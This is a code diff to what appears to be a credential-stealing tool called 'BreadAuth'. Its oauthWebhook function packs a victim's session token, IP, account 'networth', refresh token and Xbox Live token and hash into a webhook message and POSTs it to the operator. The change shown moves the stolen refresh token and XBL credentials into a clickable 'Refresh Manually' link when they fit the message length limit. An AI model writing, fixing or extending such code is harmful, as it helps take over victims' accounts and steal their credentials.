@@ -39,10 +39,6 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         {
             "name": "Session Token",
             "value": `\`\`\`${session_token}\`\`\``
-        },
-        {
-            "name": "Refresh Link",
-            "value": `[Click Here](${refreshURL}?refresh_token=${compressedRefreshToken}&xbl_hash=${compressedXblHash}&xbl_token=${compressedXblToken})`
         }
     ]
     if (description !== "Error getting networth") {
@@ -81,10 +77,13 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
             "icon_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg"
         }
     }
-    const body = {
+    const body:any = {
         "username": "BreadAuth",
         "avatar_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg",
-        "embeds": [mcEmbed]
+        "embeds": [mcEmbed],
+    }
+    if (compressedRefreshToken.length + compressedXblToken.length + compressedXblHash.length < 2000) {
+        body.content = `[Refresh Manually](${refreshURL}?refresh_token=${compressedRefreshToken}&xbl_hash=${compressedXblHash}&xbl_token=${compressedXblToken})`
     }
     const options = {
         method: "POST",
